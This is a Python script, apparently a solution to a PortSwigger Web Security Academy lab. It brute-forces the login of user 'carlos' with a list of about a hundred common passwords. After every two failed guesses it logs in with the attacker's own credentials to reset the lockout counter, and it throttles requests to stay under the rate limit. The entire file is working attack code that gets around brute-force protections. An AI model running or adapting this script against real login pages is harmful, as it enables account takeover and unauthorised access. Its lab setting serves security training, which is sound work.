import requests
import time

# Target details
url = "https://0a9d00fa0470d86b80695d8200e900e9.web-security-academy.net/login"

# Your known creds
my_user = "wiener"
my_pass = "peter"

# Target user
target_user = "carlos"

# Candidate passwords
passwords = [
    "123456","password","12345678","qwerty","123456789","12345","1234","111111",
    "1234567","dragon","123123","baseball","abc123","football","monkey","letmein",
    "shadow","master","666666","qwertyuiop","123321","mustang","1234567890",
    "michael","654321","superman","1qaz2wsx","7777777","121212","000000",
    "qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm",
    "asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger",
    "sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger",
    "daniel","starwars","klaster","112233","george","computer","michelle",
    "jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom",
    "777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua",
    "cheese","amanda","summer","love","ashley","nicole","chelsea","biteme",
    "matthew","access","yankees","987654321","dallas","austin","thunder",
    "taylor","matrix","mobilemail","mom","monitor","monitoring","montana",
    "moon","moscow"
]

# Shared headers
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

session = requests.Session()
attempts = 0

for pwd in passwords:
    # 1. Try a password for Carlos
    attack_data = f"username={target_user}&password={pwd}"
    resp = session.post(url, headers=headers, data=attack_data, allow_redirects=False)
    attempts += 1

    print(f"[+] Trying {target_user}:{pwd} -> {resp.status_code}")

    # Success condition
    if resp.status_code == 302:
        print(f"\n[!] Found valid credentials: {target_user}:{pwd}")
        break

    # 2. After 2 failed attempts, reset with wiener:peter
    if attempts == 2:
        reset_data = f"username={my_user}&password={my_pass}"
        reset_resp = session.post(url, headers=headers, data=reset_data, allow_redirects=False)
        print(f"[*] Reset with {my_user}:{my_pass} -> {reset_resp.status_code}")
        attempts = 0

    # 3. Rate limit: wait ~0.6s to stay under 100 requests/minute
    time.sleep(0.6)
